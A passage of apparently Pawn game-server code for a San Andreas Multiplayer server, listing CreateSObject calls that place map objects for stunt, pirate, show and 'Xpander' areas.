	CreateSObject(18779,1858.03,-2491.50,22.41,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18779,1818.10,-2479.41,22.41,0.00,0.00,179.78, object_show_distance, 0, world_stunts);
	CreateSObject(18781,1597.08,-2521.82,23.39,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18781,1595.79,-2563.20,23.39,0.00,0.00,178.05, object_show_distance, 0, world_stunts);
	CreateSObject(18781,1595.39,-2570.44,33.14,33.00,0.00,178.07, object_show_distance, 0, world_stunts);
	CreateSObject(18781,1596.94,-2514.46,33.14,33.00,0.00,0.10, object_show_distance, 0, world_stunts);
	CreateSObject(5004,2030.10,-2417.68,12.31,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18752,1669.93,-2398.23,0.51,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18830,2137.79,-2548.18,17.47,0.00,-207.00,359.48, object_show_distance, 0, world_stunts);
	CreateSObject(18830,2150.17,-2548.21,29.85,0.00,-244.00,359.82, object_show_distance, 0, world_stunts);
	CreateSObject(18830,2138.03,-2536.39,17.47,0.00,-207.00,359.48, object_show_distance, 0, world_stunts);
	CreateSObject(18830,2150.41,-2536.74,29.85,0.00,-244.00,359.82, object_show_distance, 0, world_stunts);
	CreateSObject(18836,2140.00,-2592.39,24.54,22.00,0.00,242.66, object_show_distance, 0, world_stunts);
	CreateSObject(18845,2161.95,-2603.89,67.46,0.00,0.00,151.78, object_show_distance, 0, world_stunts);
	CreateSObject(18801,2051.89,-2557.74,35.21,0.00,0.00,7.43, object_show_distance, 0, world_stunts);
	CreateSObject(18801,2049.28,-2538.42,35.21,0.00,0.00,7.43, object_show_distance, 0, world_stunts);
	CreateSObject(18801,2048.59,-2519.14,35.21,0.00,0.00,7.43, object_show_distance, 0, world_stunts);
	CreateSObject(18786,1752.98,-2597.09,14.99,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18786,1733.10,-2597.05,14.98,0.00,0.00,179.83, object_show_distance, 0, world_stunts);
	CreateSObject(4563,1321.91,-2533.43,28.44,55.00,0.00,269.66, object_show_distance, 0, world_stunts);
	CreateSObject(18830,1469.37,-2553.64,17.47,0.00,-207.00,359.48, object_show_distance, 0, world_stunts);
	CreateSObject(18830,1469.47,-2541.91,17.47,0.00,-207.00,359.48, object_show_distance, 0, world_stunts);
	CreateSObject(18830,1469.81,-2530.24,17.47,0.00,-207.00,359.48, object_show_distance, 0, world_stunts);
	CreateSObject(18830,1469.92,-2518.46,17.47,0.00,-207.00,359.48, object_show_distance, 0, world_stunts);
	CreateSObject(18851,1815.42,-2597.01,19.19,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18847,1929.45,-2287.03,46.41,0.00,0.00,271.31, object_show_distance, 0, world_stunts);
	CreateSObject(18779,1934.84,-2426.82,17.72,0.00,0.00,271.40, object_show_distance, 0, world_stunts);
	CreateSObject(18779,1922.86,-2427.10,17.72,0.00,0.00,271.40, object_show_distance, 0, world_stunts);
	CreateSObject(18779,1910.88,-2427.41,17.72,0.00,0.00,271.40, object_show_distance, 0, world_stunts);
	CreateSObject(18783,1531.21,-2469.93,15.06,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18783,1511.23,-2469.95,15.06,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18783,1491.30,-2469.95,15.06,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18783,1471.29,-2470.02,15.06,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18786,1551.15,-2469.94,15.11,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18786,1524.99,-2489.77,15.11,0.00,0.00,269.75, object_show_distance, 0, world_stunts);
	CreateSObject(18786,1471.26,-2490.04,15.11,0.00,0.00,269.75, object_show_distance, 0, world_stunts);
	CreateSObject(18778,1487.46,-2469.81,18.96,0.00,0.00,269.45, object_show_distance, 0, world_stunts);
	CreateSObject(19002,1495.45,-2469.67,26.23,0.00,0.00,270.24, object_show_distance, 0, world_stunts);
	CreateSObject(19002,1497.51,-2469.58,26.23,0.00,0.00,270.24, object_show_distance, 0, world_stunts);
	CreateSObject(19002,1500.12,-2469.58,26.23,0.00,0.00,270.24, object_show_distance, 0, world_stunts);
	CreateSObject(18778,1509.55,-2469.90,18.96,0.00,0.00,91.00, object_show_distance, 0, world_stunts);
	CreateSObject(18819,1504.98,-2618.61,49.30,-91.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18825,1469.61,-2618.68,33.38,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18825,1505.19,-2583.51,32.97,0.00,0.00,-91.00, object_show_distance, 0, world_stunts);
	CreateSObject(18825,1539.98,-2618.31,33.37,0.00,0.00,-178.00, object_show_distance, 0, world_stunts);
	CreateSObject(19005,1948.69,-2593.98,15.66,0.00,0.00,271.19, object_show_distance, 0, world_stunts);
	CreateSObject(19005,2004.97,-2592.61,15.66,0.00,0.00,91.00, object_show_distance, 0, world_stunts);
	CreateSObject(18761,2031.92,-2646.93,17.52,0.00,0.00,91.36, object_show_distance, 0, world_stunts);
	CreateSObject(18761,2031.46,-2628.46,17.52,0.00,0.00,91.36, object_show_distance, 0, world_stunts);
	CreateSObject(18761,2040.50,-2619.59,17.50,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18761,2058.99,-2619.61,17.50,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18761,2068.09,-2628.46,17.52,0.00,0.00,91.36, object_show_distance, 0, world_stunts);
	CreateSObject(18761,2068.09,-2628.46,17.52,0.00,0.00,91.36, object_show_distance, 0, world_stunts);
	CreateSObject(18761,2068.52,-2646.94,17.52,0.00,0.00,91.36, object_show_distance, 0, world_stunts);
	CreateSObject(19129,2058.35,-2649.00,12.52,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(19129,2058.40,-2629.16,12.52,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(19129,2038.47,-2649.00,12.52,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(19129,2038.46,-2629.24,12.52,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(19001,1707.33,-2546.10,22.37,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	// Center
	CreateSObject(18859,-136.09,92.17,13.36,0.00,0.00,339.04);
	CreateSObject(18859,-181.64,109.53,13.36,0.00,0.00,339.04);
	CreateSObject(19001,-171.30,-42.00,12.00,0.00,0.00,71.86);
	CreateSObject(19005,-248.79,-34.40,5.21,0.00,0.00,0.00);
	CreateSObject(19005,-248.89,-15.32,5.21,0.00,0.00,179.82);
	CreateSObject(19005,-248.79,9.20,-5.14,0.00,0.00,179.82);
	CreateSObject(8882,-333.65,-56.18,15.08,25.00,38.00,10.37);
	CreateSObject(8882,-332.73,-77.95,15.08,25.00,38.00,10.37);
	CreateSObject(8882,-333.88,-15.99,15.08,25.00,38.00,10.37);
	CreateSObject(18845,-195.03,-83.47,48.54,0.00,0.00,85.03);
	CreateSObject(18830,-194.00,-68.89,3.83,0.00,-164.00,77.96);
	CreateSObject(18825,-270.64,-11.79,85.27,0.00,0.00,69.75);
	CreateSObject(18819,-260.17,21.52,133.42,-89.00,0.00,343.80);
	CreateSObject(18825,-226.87,11.03,117.45,0.00,0.00,159.60);
	CreateSObject(18825,-250.27,55.03,117.86,0.00,0.00,253.02);
	CreateSObject(18825,-292.91,30.35,117.48,0.00,0.00,347.62);
	CreateSObject(18819,-260.17,21.52,38.03,-89.00,0.00,343.80);
	CreateSObject(18825,-270.64,-11.79,21.71,0.00,0.00,69.75);
	CreateSObject(18819,-260.17,21.52,69.78,-89.00,0.00,343.80);
	CreateSObject(18825,-292.91,30.35,53.93,0.00,0.00,347.62);
	CreateSObject(18825,-250.27,55.03,54.35,0.00,0.00,253.02);
	CreateSObject(18825,-226.87,11.03,53.96,0.00,0.00,159.60);
	CreateSObject(18819,-260.17,21.52,101.59,-89.00,0.00,343.80);
	CreateSObject(18786,-211.01,-25.76,4.42,0.00,0.00,72.88);
	CreateSObject(18786,-157.91,-6.33,4.42,0.00,0.00,252.63);
	CreateSObject(18781,-230.19,107.57,11.87,0.00,0.00,9.38);
	CreateSObject(18781,-232.05,117.09,32.05,55.00,0.00,9.44);
	CreateSObject(18779,-190.22,23.97,11.85,0.00,0.00,-18.00);
	CreateSObject(18779,-234.63,51.95,11.85,0.00,0.00,160.61);
	CreateSObject(18779,-226.33,15.38,11.85,0.00,0.00,251.00);
	CreateSObject(18779,-198.34,59.19,11.85,0.00,0.00,70.55);
	CreateSObject(18777,-132.66,37.33,77.54,0.00,0.00,181.71);
	CreateSObject(18777,-132.66,37.33,4.66,0.00,0.00,181.71);
	CreateSObject(18777,-132.66,37.33,30.67,0.00,0.00,181.71);
	CreateSObject(18777,-132.66,37.33,51.56,0.00,0.00,181.71);
	CreateSObject(18750,-149.86,119.75,63.85,91.00,0.00,338.71);
	CreateSObject(18786,-216.96,-44.88,4.42,0.00,0.00,252.63);
	CreateSObject(18782,-196.67,8.26,3.49,0.00,0.00,0.00);
	CreateSObject(18782,-186.18,61.35,3.49,0.00,0.00,0.00);
	CreateSObject(18800,-257.56,-66.21,5.41,0.00,0.00,50.05);
	CreateSObject(18771,-180.93,131.97,-3.70,0.00,0.00,39.44);
	CreateSObject(18771,-150.63,121.78,-3.70,0.00,0.00,39.44);
	CreateSObject(18771,-113.15,105.49,-3.70,0.00,0.00,39.44);
	CreateSObject(18761,-157.63,103.47,29.67,0.00,0.00,338.87);
	CreateSObject(19129,-153.55,112.75,25.35,0.00,0.00,339.01);
	CreateSObject(3851,-152.72,36.59,4.59,0.00,0.00,272.13);
	// Pirates
	CreateSObject(9048, -3542.82, 1831.72, 8.85,   0.00, 0.00, 28.60,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(8483, -3535.53, 1829.82, 9.69,   0.00, 0.00, 14.14,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(10166, -3463.15, 1792.67, -11.27,   0.00, 0.00, 1.61,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(8493, -3502.62, 1898.88, 18.24,   11.00, 0.00, 291.00,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(8493, -3481.38, 1828.07, 11.79,   0.00, 25.00, 52.93,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(8493, -3436.35, 1887.77, 10.85,   0.00, -30.00, 151.01,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(8493, -3423.65, 1825.98, 16.36,   0.00, 0.00, 115.78,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(8493, -3395.58, 1887.86, 15.12,   0.00, -4.00, 45.00,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(8493, -3476.23, 1858.63, 17.11,   0.00, 0.00, 78.99,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(10166, -3363.10, 1871.68, -10.80,   -18.00, 0.00, 345.66,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(10166, -3425.17, 1886.88, -11.47,   0.00, 0.00, 1.61,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(10166, -3468.04, 1895.09, -11.50,   0.00, 0.00, 31.17,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(3258, -3531.32, 1830.19, -17.24,   0.00, 0.00, 0.00,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(3258, -3532.12, 1832.45, -17.24,   0.00, 0.00, 0.00,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(3258, -3531.60, 1827.06, -17.24,   0.00, 0.00, 0.00,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(10166, -3553.61, 1820.05, -10.31,   0.00, 0.00, 332.90,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(4241, -3564.19, 1839.44, -27.97,   0.00, 0.00, 25.75,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(4241, -3359.02, 1935.50, -27.97,   0.00, 0.00, 25.75,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(4241, -3337.56, 1892.15, -27.97,   0.00, 0.00, 25.75,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(4241, -3538.93, 1848.77, -27.97,   0.00, 0.00, 25.75,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(4241, -3516.83, 1805.71, -27.97,   0.00, 0.00, 25.75,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(4241, -3542.82, 1794.07, -27.97,   0.00, 0.00, 25.75,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3513.09, 1756.52, 2.23,   0.00, 0.00, 72.43,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3418.87, 1776.44, 2.23,   0.00, 0.00, 113.23,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3341.22, 1832.16, 2.23,   0.00, 0.00, 145.09,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3284.53, 1877.04, 2.23,   0.00, 0.00, 63.01,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3308.18, 1953.27, 2.23,   0.00, 0.00, 239.95,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3393.98, 1985.68, 2.23,   0.00, 0.00, -88.07,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3477.84, 1955.75, 2.23,   0.00, 0.00, -67.07,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3558.30, 1921.35, 2.23,   0.00, 0.00, -68.15,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3630.27, 1864.13, 2.23,   0.00, 0.00, 1.63,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(7588, -3596.39, 1763.99, 2.23,   0.00, 0.00, 46.51,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(10166, -3359.11, 1910.98, -11.47,   0.00, 0.00, -59.77,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(10166, -3400.18, 1920.51, -11.47,   0.00, 0.00, -34.93,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(17026, -3550.33, 1830.47, -2.12,   0.00, 0.00, 331.72,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(3666, -3528.49, 1833.33, 9.65,   0.00, 0.00, 0.00,object_show_distance,0,worlds_dmz + dmz_pirates);
	CreateSObject(3666, -3527.32, 1828.42, 9.55,   0.00, 0.00, 0.00,object_show_distance,0,worlds_dmz + dmz_pirates);
	// Show
	CreateSObject(3406, 581.10479736328, -1853.8885498047, 4.6157484054565, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 572.35754394531, -1853.8739013672, 4.6346864700317, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 563.5556640625, -1853.8818359375, 4.6565356254578, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 563.544921875, -1855.884765625, 4.6589598655701, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 572.3544921875, -1855.8798828125, 4.6727976799011, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 581.1044921875, -1855.888671875, 4.6466603279114, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 589.892578125, -1855.88671875, 4.6388926506042, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 589.890625, -1853.8837890625, 4.6435861587524, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 563.57293701172, -1851.9213867188, 4.655469417572, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 572.33959960938, -1851.9393310547, 4.6391458511353, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 581.130859375, -1851.9611816406, 4.6449394226074, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 589.86389160156, -1851.9122314453, 4.6479873657227, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 563.55889892578, -1849.9191894531, 4.6881775856018, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 572.32244873047, -1849.9537353516, 4.6806869506836, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 581.11633300781, -1849.9655761719, 4.6959085464478, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 589.90997314453, -1849.9682617188, 4.6895413398743, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 563.55480957031, -1847.9196777344, 4.6805357933044, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 572.35247802734, -1847.9230957031, 4.6756777763367, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 581.09283447266, -1847.9324951172, 4.6753649711609, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 589.91204833984, -1847.9615478516, 4.6916284561157, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 570.15167236328, -1845.9468994141, 6.2678956985474, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 578.95983886719, -1845.9202880859, 6.2718110084534, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 570.16949462891, -1843.9227294922, 6.2652606964111, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 578.94909667969, -1843.9268798828, 6.2617073059082, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 578.95062255859, -1841.9151611328, 6.2816615104675, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(3406, 570.17352294922, -1841.9211425781, 6.2682867050171, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(16092, 575.1025390625, -1856.0302734375, 5.6687879562378, 0, 0, 269.24743652344, object_show_distance, 0, world_show);
	CreateSObject(16092, 574.546875, -1846.10546875, 6.7676281929016, 0, 0, 269.74731445313, object_show_distance, 0, world_show);
	CreateSObject(2169, 575.53393554688, -1844.3939208984, 8.3360786437988, 0, 0, 180, object_show_distance, 0, world_show);
	CreateSObject(2169, 574.08856201172, -1844.38671875, 8.3360786437988, 0, 0, 180, object_show_distance, 0, world_show);
	CreateSObject(14820, 573.75720214844, -1844.3754882813, 9.2374086380005, 0, 0, 180, object_show_distance, 0, world_show);
	CreateSObject(1957, 575.42163085938, -1844.4020996094, 9.2348718643188, 0, 0, 270, object_show_distance, 0, world_show);
	CreateSObject(2229, 579.48461914063, -1846.0401611328, 8.3426294326782, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 578.54809570313, -1846.05859375, 8.3426294326782, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 579.40576171875, -1846.00390625, 10.128213882446, 0, 270.50006103516, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 579.48992919922, -1845.9992675781, 9.9142656326294, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 578.58050537109, -1845.9653320313, 9.962607383728, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 571.17779541016, -1846.0638427734, 8.3387136459351, 0, 0, 1.75, object_show_distance, 0, world_show);
	CreateSObject(2229, 570.17651367188, -1846.0745849609, 8.3387136459351, 0, 0, 1.496826171875, object_show_distance, 0, world_show);
	CreateSObject(2229, 569.67102050781, -1846.0755615234, 9.5637159347534, 0, 90, 1.4941711425781, object_show_distance, 0, world_show);
	CreateSObject(2229, 571.18127441406, -1846.0017089844, 10.007572174072, 0, 0, 1.746826171875, object_show_distance, 0, world_show);
	CreateSObject(2229, 570.17761230469, -1846.0812988281, 10.031239509583, 0, 0, 1.746826171875, object_show_distance, 0, world_show);
	CreateSObject(2229, 576.57281494141, -1844.8580322266, 8.3426294326782, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 576.58123779297, -1844.8585205078, 9.6753482818604, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 572.712890625, -1844.8583984375, 8.3360786437988, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 572.70361328125, -1844.8577880859, 9.684775352478, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 576.91632080078, -1844.8469238281, 8.3398323059082, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 576.91363525391, -1844.8792724609, 9.6825857162476, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 572.38494873047, -1844.8493652344, 8.3394918441772, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2229, 572.37927246094, -1844.8540039063, 9.6925859451294, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(16000, 583.03863525391, -1840.9454345703, 4.2387542724609, 0, 0, 179.99450683594, object_show_distance, 0, world_show);
	CreateSObject(16000, 564.78485107422, -1840.9351806641, 4.2883777618408, 0, 0, 179.99450683594, object_show_distance, 0, world_show);
	CreateSObject(18102, 579.38952636719, -1848.9304199219, 14.638555526733, 337.501953125, 359.18817138672, 359.689453125, object_show_distance, 0, world_show);
	CreateSObject(994, 558.72265625, -1860.404296875, 3.682377576828, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(994, 564.98901367188, -1860.3961181641, 3.6534645557404, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2773, 572.2841796875, -1860.3653564453, 4.1420731544495, 0, 0, 270, object_show_distance, 0, world_show);
	CreateSObject(994, 581.28643798828, -1860.3562011719, 3.6974501609802, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(2773, 574.3203125, -1860.3549804688, 4.1302900314331, 0, 0, 270, object_show_distance, 0, world_show);
	CreateSObject(2773, 576.32861328125, -1860.3387451172, 4.1280450820923, 0, 0, 270, object_show_distance, 0, world_show);
	CreateSObject(2773, 578.34442138672, -1860.3463134766, 4.1321902275085, 0, 0, 270, object_show_distance, 0, world_show);
	CreateSObject(2773, 580.31884765625, -1860.3532714844, 4.1335368156433, 0, 0, 270, object_show_distance, 0, world_show);
	CreateSObject(994, 587.552734375, -1860.3505859375, 3.6858174800873, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(994, 559.05328369141, -1856.6853027344, 6.8297781944275, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(994, 558.92205810547, -1850.3885498047, 6.8523545265198, 0, 0, 270.25, object_show_distance, 0, world_show);
	CreateSObject(994, 593.58337402344, -1847.1296386719, 6.8124465942383, 0, 0, 270.24719238281, object_show_distance, 0, world_show);
	CreateSObject(994, 593.63104248047, -1850.2692871094, 6.810676574707, 0, 0, 270.25, object_show_distance, 0, world_show);
	CreateSObject(994, 593.63464355469, -1856.5120849609, 6.8394045829773, 0, 0, 180.24719238281, object_show_distance, 0, world_show);
	CreateSObject(997, 584.23382568359, -1856.5399169922, 6.8174786567688, 0, 0, 0, object_show_distance, 0, world_show);
	CreateSObject(994, 558.70806884766, -1860.3817138672, 3.6841900348663, 0, 1.75, 268.75, object_show_distance, 0, world_show);
	CreateSObject(994, 558.56951904297, -1866.544921875, 3.4772644042969, 0, 2.5, 268.74755859375, object_show_distance, 0, world_show);
	CreateSObject(994, 558.44787597656, -1872.7032470703, 3.1857147216797, 0, 2.25, 268.74755859375, object_show_distance, 0, world_show);
	CreateSObject(994, 593.73852539063, -1860.3156738281, 3.8455405235291, 0, 0.75, 266, object_show_distance, 0, world_show);
	CreateSObject(994, 593.29168701172, -1866.4718017578, 3.735680103302, 0, 2.25, 265.99548339844, object_show_distance, 0, world_show);
	CreateSObject(994, 592.85906982422, -1872.6318359375, 3.4435303211212, 0, 2.25, 265.99548339844, object_show_distance, 0, world_show);
	// Xpander
	CreateSObject(4030,1543.96,-1353.40,837.15,0.00,0.00,0.00);
	CreateSObject(4030,1462.00,-1333.86,839.50,0.00,0.00,0.00);
	CreateSObject(3865,1479.52,-1346.34,840.55,11.00,0.00,166.06);
	CreateSObject(9831,1532.56,-1347.22,833.67,6.00,0.00,258.10);
	CreateSObject(9831,1531.08,-1354.49,833.67,6.00,0.00,258.10);
	CreateSObject(9831,1557.20,-1358.45,833.15,6.00,0.00,258.10);
	CreateSObject(9831,1558.81,-1351.20,833.15,6.00,0.00,258.10);
	CreateSObject(9831,1552.22,-1351.34,833.15,6.00,0.00,258.10);
	CreateSObject(9831,1550.43,-1354.34,833.25,6.00,0.00,258.10);
	CreateSObject(9831,1578.47,-1363.65,832.74,6.00,0.00,258.10);
	CreateSObject(9831,1580.12,-1356.42,832.74,6.00,0.00,258.10);
	CreateSObject(9831,1588.56,-1360.15,833.06,6.00,0.00,164.44);
	CreateSObject(9831,1598.61,-1368.55,832.34,6.00,0.00,258.10);
	CreateSObject(9831,1511.16,-1341.96,834.24,6.00,0.00,258.10);
	CreateSObject(9831,1510.26,-1349.39,834.24,6.00,0.00,258.10);
	CreateSObject(9831,1494.37,-1343.54,834.84,6.00,0.00,258.10);
	CreateSObject(9831,1497.60,-1337.80,834.84,6.00,0.00,258.10);
	CreateSObject(9831,1475.74,-1331.74,835.39,6.00,0.00,258.10);
	CreateSObject(9831,1474.13,-1339.17,835.39,6.00,0.00,258.10);
	CreateSObject(9831,1461.06,-1329.90,835.79,6.00,0.00,258.10);
	CreateSObject(9831,1450.99,-1334.16,835.99,6.00,0.00,258.10);
	CreateSObject(9831,1450.48,-1327.30,835.99,6.00,0.00,258.10);
	CreateSObject(9831,1448.34,-1333.39,835.99,6.00,0.00,258.10);
	CreateSObject(3865,1502.33,-1338.64,842.65,0.00,0.00,345.41);
	CreateSObject(9831,1497.45,-1337.28,838.44,0.00,0.00,178.00);
	CreateSObject(3865,1500.17,-1347.34,842.65,0.00,0.00,345.41);
	CreateSObject(3865,1498.93,-1334.11,840.42,11.00,0.00,339.92);
	CreateSObject(9831,1480.66,-1343.51,838.79,0.00,0.00,0.00);
	CreateSObject(3865,1514.85,-1355.32,838.91,11.00,0.00,166.06);
	CreateSObject(9831,1516.16,-1351.79,836.84,0.00,0.00,0.00);
	CreateSObject(3865,1537.20,-1343.13,838.67,11.00,0.00,339.92);
	CreateSObject(9831,1535.47,-1346.69,836.67,0.00,0.00,178.00);
	CreateSObject(3865,1591.22,-1353.61,835.97,0.00,0.00,345.31);
	CreateSObject(3865,1589.58,-1356.18,842.21,271.00,0.00,345.00);
	CreateSObject(3865,1592.25,-1357.20,842.21,271.00,0.00,345.00);
	CreateSObject(3865,1593.34,-1358.18,842.21,271.00,0.00,345.00);
	CreateSObject(9573,1575.76,-1346.33,824.58,0.00,0.00,354.71);
	CreateSObject(3865,1593.34,-1358.18,833.47,89.00,0.00,345.00);
	CreateSObject(4109,1647.48,-1380.48,836.16,0.00,0.00,75.25);
	CreateSObject(3865,1593.60,-1359.87,836.67,89.00,0.00,345.00);
	CreateSObject(8210,1587.41,-1386.89,837.00,0.00,0.00,-104.58);
	CreateSObject(3865,1589.39,-1366.38,841.49,0.00,0.00,345.41);
	CreateSObject(3865,1592.25,-1367.40,839.71,0.00,0.00,345.41);
	CreateSObject(3865,1591.70,-1367.71,841.49,0.00,0.00,345.41);
	CreateSObject(3865,1581.46,-1365.21,832.79,0.00,0.00,351.06);
	CreateSObject(3865,1590.79,-1361.27,841.49,0.00,0.00,345.41);
	CreateSObject(3865,1589.00,-1371.35,836.67,89.00,0.00,345.00);
	CreateSObject(9831,1601.00,-1361.57,832.34,6.00,0.00,258.10);
	CreateSObject(3865,1593.50,-1345.24,835.97,0.00,0.00,345.31);
	CreateSObject(9831,1588.51,-1360.27,833.06,6.00,0.00,164.44);
	CreateSObject(3865,1595.88,-1336.50,835.97,0.00,0.00,345.31);
	CreateSObject(9831,1588.51,-1360.27,833.06,6.00,0.00,164.44);
	CreateSObject(9831,1532.81,-1347.21,833.67,6.00,0.00,258.10);
	CreateSObject(9831,1531.12,-1354.44,833.67,6.00,0.00,258.10);
	CreateSObject(9831,1557.20,-1358.45,833.15,6.00,0.00,258.10);
	CreateSObject(9831,1558.81,-1351.20,833.15,6.00,0.00,258.10);
	CreateSObject(9831,1552.22,-1351.34,833.15,6.00,0.00,258.10);
	CreateSObject(9831,1550.43,-1354.34,833.25,6.00,0.00,258.10);
	CreateSObject(9831,1578.47,-1363.65,832.74,6.00,0.00,258.10);
	CreateSObject(9831,1580.12,-1356.42,832.74,6.00,0.00,258.10);
	CreateSObject(9831,1588.56,-1360.15,833.06,6.00,0.00,164.44);
	CreateSObject(9831,1598.61,-1368.55,832.34,6.00,0.00,258.10);
	CreateSObject(9831,1511.16,-1341.96,834.24,6.00,0.00,258.10);
	CreateSObject(9831,1510.26,-1349.39,834.24,6.00,0.00,258.10);
	CreateSObject(9831,1494.37,-1343.54,834.84,6.00,0.00,258.10);
	CreateSObject(9831,1497.60,-1337.80,834.84,6.00,0.00,258.10);
	CreateSObject(9831,1475.74,-1331.74,835.39,6.00,0.00,258.10);
	CreateSObject(9831,1474.13,-1339.17,835.39,6.00,0.00,258.10);
	CreateSObject(9831,1461.06,-1329.90,835.79,6.00,0.00,258.10);
	CreateSObject(9831,1450.99,-1334.16,835.99,6.00,0.00,258.10);
	CreateSObject(9831,1450.48,-1327.30,835.99,6.00,0.00,258.10);
	CreateSObject(9831,1448.34,-1333.39,835.99,6.00,0.00,258.10);
	CreateSObject(9831,1621.57,-1375.13,832.03,6.00,0.00,255.25);
